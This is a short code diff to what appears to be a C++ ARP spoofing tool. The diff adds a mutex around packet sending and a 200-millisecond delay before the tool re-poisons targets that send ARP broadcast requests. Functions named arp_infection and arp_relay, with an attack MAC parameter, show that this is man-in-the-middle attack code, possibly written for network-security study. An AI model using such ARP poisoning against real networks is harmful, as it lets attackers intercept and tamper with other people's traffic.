@@ -206,13 +206,15 @@ bool send_arp_request(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip target_ip, Mac& tar
     packet.arp_.sip_ = htonl(static_cast<uint32_t>(my_ip));
     packet.arp_.tmac_ = Mac::nullMac();
     packet.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));
-    
-    
-    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-        return false;
+    {
+        std::lock_guard<std::mutex> lk(pcap_mutex);
+        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+            return false;
+        }
     }
+
     struct pcap_pkthdr* header;
     const uint8_t* recv_pkt;
     int res_recv;
@@ -294,6 +296,7 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac sender_mac, Mac target_mac, Ip 
             //cout << "arp : " <<string(ethhdr->dmac()) << " " << arp_pkt->op() << endl
             if ((ethhdr->smac() == sender_mac || ethhdr->smac() == target_mac) && ethhdr->dmac() == Mac::broadcastMac() && (arp_pkt->op() == ArpHdr::Request))
             {
+                std::this_thread::sleep_for(std::chrono::milliseconds(200));
                 if (!arp_infection(pcap, attack_mac, sender_mac, sender_ip, target_ip)) {
                     cout << "Failed ARP infection\n";
                         return false;
